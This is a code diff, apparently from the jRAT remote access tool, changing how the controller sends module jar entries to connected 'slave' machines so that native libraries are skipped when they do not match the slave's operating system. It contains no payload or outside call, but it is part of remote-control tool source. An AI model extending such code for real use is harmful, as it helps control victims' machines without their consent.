@@ -4,6 +4,7 @@ import jrat.api.ControllerModule;
 import jrat.common.Logger;
 import jrat.common.compress.QuickLZ;
 import jrat.controller.AbstractSlave;
+import oslib.OperatingSystem;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -82,6 +83,30 @@ public final class Module {
 
         JarEntry entry;
         while ((entry = jis.getNextJarEntry()) != null) {
+            String name = entry.getName();
+
+            // skip native libraries incompatible with platform
+            int index = name.lastIndexOf(".");
+            String extension = index == -1 ? "" : name.substring(name.lastIndexOf("."));
+
+            switch (extension) {
+                case ".dylib":
+                    if (slave.getOperatingSystem().getType() != OperatingSystem.MACOS) {
+                        continue;
+                    }
+                    break;
+                case ".dll":
+                    if (slave.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
+                        continue;
+                    }
+                    break;
+                case ".so":
+                    if (!slave.getOperatingSystem().isUnix()) {
+                        continue;
+                    }
+                    break;
+            }
+
             int size = (int) entry.getSize();
 
             if (size == 0) {
@@ -105,11 +130,11 @@ public final class Module {
 
             array = QuickLZ.compress(array, 3);
             total += array.length;
-            Logger.log("\tclass " + entry.getName() + " (" + uncompressedSize + " -> " + array.length + " bytes)");
+            Logger.log("\tclass " + name + " (" + uncompressedSize + " -> " + array.length + " bytes)");
 
             slave.writeBoolean(true);
-            slave.writeBoolean(entry.getName().endsWith(".class"));
-            slave.writeLine(entry.getName());
+            slave.writeBoolean(name.endsWith(".class"));
+            slave.writeLine(name);
             slave.writeInt(array.length);
             slave.write(array);
         }
